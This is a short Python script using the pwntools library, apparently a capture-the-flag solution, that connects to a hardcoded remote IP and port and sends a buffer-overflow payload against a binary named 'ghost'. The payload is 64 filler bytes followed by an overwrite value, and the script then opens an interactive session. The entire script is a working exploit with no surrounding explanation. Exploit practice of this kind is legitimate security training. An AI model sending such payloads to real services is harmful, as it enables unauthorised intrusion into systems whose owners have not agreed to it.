from pwn import *

exe = './ghost'
host, port = '139.144.184.150', 4000
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*64

payload = flat([
    offset,
    0x44434241
])

io.sendline(payload)
io.interactive()